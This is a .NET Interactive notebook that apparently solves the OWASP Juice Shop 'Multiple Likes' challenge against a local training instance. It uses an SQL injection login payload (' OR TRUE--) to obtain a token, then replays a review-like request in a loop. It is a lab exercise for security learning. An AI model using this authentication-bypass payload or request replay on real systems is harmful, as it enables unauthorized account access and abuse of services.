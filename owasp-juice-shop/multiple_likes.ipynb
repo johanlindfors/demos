{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Multiple Likes\n",
    "\n",
    "## Access a confidential document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\n",
    "{\n",
    "    \"email\": \"' OR TRUE--\",\n",
    "    \"password\": \"12345\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#r \"nuget: System.Net.Http.Json, *-*\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Net.Http;\n",
    "using System.Net.Http.Json;\n",
    "using System.Net.Http.Headers;\n",
    "\n",
    "const string BASE_URL = \"http://localhost:3000/\";\n",
    "var BASE_URI = new Uri(BASE_URL);\n",
    "string authenticationToken = string.Empty;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share json --from value\n",
    "\n",
    "public struct AuthenticationToken {\n",
    "    public Authentication Authentication {get;set;}\n",
    "}\n",
    "\n",
    "public struct Authentication {\n",
    "    public string Token { get;set; }\n",
    "    public int Bid { get;set; }\n",
    "    public string Umail { get;set; }\n",
    "}\n",
    "\n",
    "public struct ResponseStruct {\n",
    "    public string Status {get;set;}\n",
    "    public IList<Review> Data {get;set;}\n",
    "}\n",
    "\n",
    "// {\n",
    "//     \"message\":\"Fry liked it too.\",\n",
    "//     \"author\":\"bender@juice-sh.op\",\n",
    "//     \"product\":6,\n",
    "//     \"likesCount\":1,\n",
    "//     \"likedBy\":[\"userTest@test.se\"],\n",
    "//     \"_id\":\"PTddcFQNXf2kvt2zo\",\n",
    "//     \"liked\":true\n",
    "// }\n",
    "public struct Review {\n",
    "    public string Message {get;set;}\n",
    "    public string Author {get;set;}\n",
    "    public int Product {get;set;}\n",
    "    public int LikesCount {get;set;}\n",
    "    public IList<string> LikedBy {get;set;}\n",
    "    public bool Liked {get;set;}\n",
    "}\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "    var response = await client.PostAsync(\"http://localhost:3000/rest/user/login\", content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "\n",
    "    var actualtoken = await response.Content.ReadFromJsonAsync<AuthenticationToken>();\n",
    "    Console.WriteLine(actualtoken.Authentication.Token);\n",
    "    authenticationToken = actualtoken.Authentication.Token;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's try the same example with plain javascript"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name reviewIdJson\n",
    "{\n",
    "    \"id\":\"PTddcFQNXf2kvt2zo\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share reviewIdJson --from value\n",
    "\n",
    "using(var client = new HttpClient()) {\n",
    "    \n",
    "    var request = new HttpRequestMessage\n",
    "    {\n",
    "        Method = HttpMethod.Post,\n",
    "        Content = new StringContent(reviewIdJson, Encoding.UTF8, \"application/json\"),\n",
    "        RequestUri = new Uri(BASE_URI, \"rest/products/reviews\")\n",
    "    };\n",
    "\n",
    "    request.Headers.Authorization = new AuthenticationHeaderValue(\"Bearer\", authenticationToken);\n",
    "    for(int i = 0; i<5 ; i++) {\n",
    "        var response = await client.SendAsync(request);\n",
    "        Console.WriteLine(response.StatusCode);\n",
    "    }\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
